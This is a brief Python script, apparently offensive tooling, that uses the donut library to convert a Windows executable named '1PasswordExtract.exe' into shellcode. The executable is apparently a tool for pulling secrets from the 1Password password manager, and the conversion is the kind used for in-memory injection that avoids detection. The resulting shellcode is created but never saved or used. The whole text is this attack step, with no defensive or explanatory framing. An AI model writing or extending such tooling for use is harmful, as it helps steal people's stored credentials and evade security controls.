import donut

def main():
	path = "1PasswordExtract\\1PasswordExtract\\bin\\x86\\Release\\1PasswordExtract.exe"
	shellcode = donut.create(file=path, arch=1)

if __name__ == '__main__':
	main()